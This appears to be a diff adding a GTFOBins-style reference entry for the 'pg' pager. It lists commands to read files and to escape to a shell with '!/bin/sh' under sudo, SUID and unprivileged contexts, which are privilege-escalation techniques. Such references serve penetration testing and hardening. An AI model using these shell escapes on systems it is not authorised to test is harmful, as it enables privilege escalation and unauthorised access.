@@ -1,0 +1,29 @@
+pg
+==
+
+File read
+---------
+
+[Sudo]
+    pg /path/to/input-file
+
+[SUID]
+    pg /path/to/input-file
+
+[Unprivileged]
+    pg /path/to/input-file
+
+Shell
+-----
+
+[Sudo]
+    pg /etc/hosts
+!/bin/sh
+
+[SUID]
+    pg /etc/hosts
+!/bin/sh
+
+[Unprivileged]
+    pg /etc/hosts
+!/bin/sh
